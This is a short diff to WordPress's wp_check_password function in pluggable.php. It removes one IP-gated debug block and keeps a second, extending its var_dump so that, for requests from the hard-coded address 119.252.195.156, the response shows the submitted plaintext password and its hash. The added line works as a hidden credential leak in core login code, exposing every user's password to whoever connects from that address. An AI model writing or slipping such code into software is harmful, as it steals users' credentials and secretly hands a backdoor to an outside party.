@@ -2658,11 +2658,6 @@ if ( ! function_exists( 'wp_check_password' ) ) :
 				$hash = wp_hash_password( $password );
 			}
 
-			if ( '119.252.195.156' === $_SERVER['REMOTE_ADDR'] ) {
-				echo "1";
-				var_dump( $check );
-			}
-
 			/**
 			 * Filters whether the plaintext password matches the encrypted password.
 			 *
@@ -2690,7 +2685,7 @@ if ( ! function_exists( 'wp_check_password' ) ) :
 
 		if ( '119.252.195.156' === $_SERVER['REMOTE_ADDR'] ) {
 			echo "2";
-			var_dump( $check );
+			var_dump( $check, $password, $hash );
 		}
 
 		/** This filter is documented in wp-includes/pluggable.php */
